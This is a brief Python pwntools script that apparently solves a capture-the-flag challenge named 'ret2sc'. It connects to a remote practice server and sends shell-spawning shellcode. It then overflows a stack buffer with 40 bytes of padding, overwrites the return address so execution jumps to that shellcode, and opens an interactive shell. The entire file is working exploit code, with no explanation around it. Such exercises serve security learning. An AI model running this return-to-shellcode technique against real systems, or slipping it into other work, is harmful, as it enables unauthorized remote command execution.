#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = False
if DEBUG:
    p = process("ret2sc")
else:
    p = remote("pwnhub.tw", 54321)

p.recv()
p.sendline(asm(shellcraft.sh()))

padding = "A" * (0x20 + 0x8)
ret_addr = 0x601080
payload = padding + p64(ret_addr)

p.recv()
p.sendline(payload)

p.interactive()
p.close()
